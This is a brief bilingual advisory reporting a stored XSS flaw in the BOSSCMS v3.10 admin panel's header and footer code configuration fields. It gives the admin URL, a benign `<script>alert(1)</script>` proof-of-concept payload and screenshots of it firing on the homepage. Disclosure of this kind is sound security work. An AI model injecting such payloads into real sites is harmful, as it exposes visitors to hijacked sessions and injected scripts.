# BOSSCMSv3.10 background project management--code configuration--stored XSS exists in the header code and bottom code
- **Exploit Title:** BOSSCMS background project management--code configuration--stored XSS exists in the header code and bottom code
- **Date:** 2024-04-01
- **Exploit Author:** shuo sheng,jixin zhang
- **Vendor Homepage:** [https://code-projects.org/simple-school-management-in-php-with-source-code/](https://gitee.com/Greenpeas/BOSSCMS)
- **Software Link:** [https://download.code-projects.org/details/d10e92aa-e37f-46fd-9bf8-45878956d7c0](https://gitee.com/Greenpeas/BOSSCMS/archive/refs/tags/V3.1202310281625.zip)
- **Version:** Bosscms v3.10

# BOSSCMS后台项目管理--代码配置--头部代码和底部代码存在存储型XSS

url:http://127.0.0.1/bosscms1/admin/#mpf=site/code

payload:

```html
<script>alert(1)</script>
```

![图片](https://github.com/ss122-0ss/BOSSCMS/assets/131983607/cae2cb2c-a48b-4678-833c-10c7eb4a4f8b)



Return to homepage, trigger XSS

返回首页，触发XSS

![图片](https://github.com/ss122-0ss/BOSSCMS/assets/131983607/1e227c98-897d-46c2-963a-99e59fca4681)
